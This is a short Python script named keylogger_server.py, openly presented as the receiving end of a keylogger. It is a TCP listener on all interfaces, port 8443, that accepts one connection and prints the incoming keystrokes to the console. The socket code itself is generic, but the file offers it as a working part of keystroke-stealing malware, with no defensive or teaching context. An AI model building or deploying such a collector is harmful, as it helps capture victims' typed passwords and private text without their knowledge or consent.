#!/usr/bin/env python3
"""
keylogger_server.py
Author: amm2825
Description: A simple TCP server that listens for incoming connections and prints any data received.
"""

import socket

def main():
    host = "0.0.0.0"  # Listen on all interfaces
    port = 8443       # Pick an open port

    # Create and bind socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print(f"[+] Listening on {host}:{port}")

    # Accept a single connection
    client_socket, addr = server_socket.accept()
    print(f"[+] Connection from {addr}")

    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break  # connection closed
            # Print received keystrokes (decoding from bytes to string)
            print(data.decode("utf-8"), end="", flush=True)
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")
    finally:
        client_socket.close()
        server_socket.close()

if __name__ == "__main__":
    main()
